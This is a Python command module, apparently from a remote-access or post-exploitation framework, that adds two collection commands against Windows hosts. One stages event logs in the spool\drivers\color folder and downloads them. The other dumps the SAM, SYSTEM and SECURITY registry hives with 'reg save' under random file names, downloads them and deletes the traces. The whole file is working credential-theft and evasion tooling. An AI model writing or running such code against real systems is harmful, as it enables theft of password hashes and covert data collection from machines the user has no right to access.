"""Commands that collect remote artifacts."""

import random
import string

from modules.command_registry import command
from modules.context import CommandUsageError


def _random_name():
    return "".join(random.choices(string.ascii_letters, k=random.randint(8, 12)))


@command("loggrab", "Collection", "Download a Windows event log", "loggrab <name.evtx>")
def collect_event_log(context, arguments: str) -> None:
    name = arguments.strip()
    if not name or any(character in name for character in "\\/:"):
        raise CommandUsageError("loggrab expects an event-log filename such as Security.evtx")

    staged = rf"C:\Windows\System32\spool\drivers\color\{name}"
    source = rf"C:\Windows\System32\Winevt\Logs\{name}"
    try:
        context.write(context.run(f'copy "{source}" "{staged}"'))
        destination = context.download(staged, context.artifact_path(name))
        print(f"[+] event log saved to {destination}")
    finally:
        context.run(f'del /Q "{staged}"')


@command("regrip", "Collection", "Collect SAM, SYSTEM, and SECURITY registry hives", "regrip")
def collect_registry_hives(context, arguments: str) -> None:
    hives = (("SAM", "SAM"), ("SYSTEM", "System"), ("SECURITY", "Security"))
    staged_files = []
    try:
        for hive, local_name in hives:
            staged = _random_name() + ".hive"
            staged_files.append(staged)
            output = context.run(f'reg save "HKLM\\{hive}" "{staged}" /y')
            context.write(output)
            destination = context.download(staged, context.artifact_path(local_name))
            print(f"[+] {hive} saved to {destination}")
    finally:
        for staged in staged_files:
            context.run(f'del /Q "{staged}"')
